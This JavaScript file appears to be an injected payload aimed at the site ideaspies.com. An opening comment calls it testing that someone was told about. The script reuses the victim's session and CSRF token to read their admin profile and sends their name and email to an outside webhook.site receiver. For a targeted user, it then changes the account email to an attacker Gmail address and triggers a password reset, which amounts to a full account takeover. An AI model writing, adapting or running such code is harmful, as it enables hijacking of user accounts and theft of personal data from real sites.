// Shanil, don't be alarmed. I've already told Lynn about this. Just testing stuff.
let _mToken = $('meta[name="csrf-token"]').attr('content')
let _mTargetUsername = 'ideaspy4832'
let _mTargetEmail = 'ideaspy1001@gmail.com'
let _mReceiver = 'https://webhook.site/8723bbba-a23b-4937-b358-bc98f05698a2'
let _mEmail = ''
let _mName = ''

// Can't be bothered coding www check
fetch("https://ideaspies.com/user/admin/profile", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-GB,en;q=0.9",
    "cache-control": "no-cache",
    "pragma": "no-cache",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1"
  },
  "referrer": "https://ideaspies.com/user/admin/profile",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": null,
  "method": "GET",
  "mode": "cors",
  "credentials": "include"
}).then(function (response) {
	return response.text();
}).then(function (html) {
	// Send data to a server so original email can be saved
	let parser = new DOMParser();
	let doc = parser.parseFromString(html, 'text/html');
	
	_mName = doc.querySelector('#first_name').getAttribute('value');
	_mEmail = doc.querySelector('#email').getAttribute('value');
	return fetch(_mReceiver + '?email=' + _mEmail + '&name=' + _mName, {'mode':'no-cors'});
}).then(function(response){
	// Change email if username matches target, server automatically sets new password and uses stored email to change the profile back to normal
	if (_mName.toLowerCase() === _mTargetUsername) {
		return fetch("https://ideaspies.com/user/admin/profile", {
		  "headers": {
		    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		    "accept-language": "en-GB,en;q=0.9",
		    "cache-control": "no-cache",
		    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryPYa5L16IPdEEvuCR",
		    "pragma": "no-cache",
		    "sec-fetch-dest": "document",
		    "sec-fetch-mode": "navigate",
		    "sec-fetch-site": "same-origin",
		    "sec-fetch-user": "?1",
		    "upgrade-insecure-requests": "1"
		  },
		  "referrer": "https://ideaspies.com/user/admin/profile",
		  "referrerPolicy": "strict-origin-when-cross-origin",
		  "body": "------WebKitFormBoundaryPYa5L16IPdEEvuCR\r\nContent-Disposition: form-data; name=\"_token\"\r\n\r\n" + _mToken + "\r\n------WebKitFormBoundaryPYa5L16IPdEEvuCR\r\nContent-Disposition: form-data; name=\"first_name\"\r\n\r\n" + _mName + "\r\n------WebKitFormBoundaryPYa5L16IPdEEvuCR\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n" + _mTargetEmail + "\r\n------WebKitFormBoundaryPYa5L16IPdEEvuCR\r\nContent-Disposition: form-data; name=\"Profile_Picture\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryPYa5L16IPdEEvuCR--\r\n",
		  "method": "POST",
		  "mode": "cors",
		  "credentials": "include"
		});	
	} else {
		throw new Error('username mismatch');
	}
}).then(function (response) {
	// Send password reset
	return fetch("https://ideaspies.com/reset", {
	  "headers": {
	    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	    "accept-language": "en-GB,en;q=0.9",
	    "cache-control": "no-cache",
	    "content-type": "application/x-www-form-urlencoded",
	    "pragma": "no-cache",
	    "sec-fetch-dest": "document",
	    "sec-fetch-mode": "navigate",
	    "sec-fetch-site": "same-origin",
	    "sec-fetch-user": "?1",
	    "upgrade-insecure-requests": "1"
	  },
	  "referrer": "https://ideaspies.com/reset",
	  "referrerPolicy": "strict-origin-when-cross-origin",
	  "body": "_token=" + _mToken + "&email=" + encodeURIComponent(_mTargetEmail),
	  "method": "POST",
	  "mode": "cors",
	  "credentials": "include"
	});
}).then(function (response) {
	return fetch(_mReceiver + '?email=' + _mEmail + '&name=' + _mName + '&complete=true', {'mode':'no-cors'});
}).then(function (response) {	
}).catch(function (err) {
});
